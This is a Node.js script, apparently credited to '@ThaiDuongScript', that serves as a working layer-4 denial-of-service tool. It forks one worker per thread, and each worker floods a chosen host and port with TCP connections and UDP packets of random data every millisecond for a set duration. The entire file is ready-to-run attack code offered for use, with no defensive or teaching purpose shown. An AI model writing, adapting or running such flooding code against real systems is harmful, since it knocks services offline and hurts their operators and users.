const net = require('net');
const dgram = require('dgram');
const cluster = require('cluster');
const os = require('os');


const [,, targetHost, targetPortStr, durationStr, threadsStr, mode] = process.argv;

const targetPort = parseInt(targetPortStr);
const duration = parseInt(durationStr);
const threads = parseInt(threadsStr) || os.cpus().length;
const attackMode = (mode || 'both').toLowerCase();

if (!targetHost || !targetPort || !duration || !threads || !['tcp', 'udp', 'both'].includes(attackMode)) {
    console.log('Made by @ThaiDuongScript')
    console.log('Usage: node layer4_burst_mode.js <host> <port> <duration_sec> <threads> <mode: tcp|udp|both>');
    process.exit(1);
}


function randomPayload(length = 64) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let data = '';
    for (let i = 0; i < length; i++) {
        data += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return Buffer.from(data);
}


function floodLoop() {
    const udpSocket = dgram.createSocket('udp4');
    let packetsSent = 0;

    setInterval(() => {
        if (attackMode === 'tcp' || attackMode === 'both') {
            const tcp = new net.Socket();
            tcp.setNoDelay(true);
            tcp.connect(targetPort, targetHost, () => {
    setTimeout(() => {
        for (let i = 0; i < threads; i++) {
            tcp.write(randomPayload(128));
            packetsSent++;
        }
    }, 100); 
    setTimeout(() => tcp.destroy(), 500);
});
            tcp.on('error', (err) => {
    });
        }

        if (attackMode === 'udp' || attackMode === 'both') {
            for (let i = 0; i < threads; i++) {
                const msg = randomPayload(64);
                udpSocket.send(msg, 0, msg.length, targetPort, targetHost, () => {
                    packetsSent++;
                });
            }
        }
        console.log(`[Worker ${cluster.worker.id}] send ${packetsSent} packet.`);
    }, 1);
}


if (cluster.isPrimary) {
    console.log(`[Master] started ${attackMode.toUpperCase()} flood to ${targetHost}:${targetPort} in ${duration}s with ${threads} threads`);
    for (let i = 0; i < threads; i++) cluster.fork();
    setTimeout(() => {
        console.log(`[Master] Kết thúc.`);
        process.exit(0);
    }, duration * 1000);
} else {
    floodLoop();
}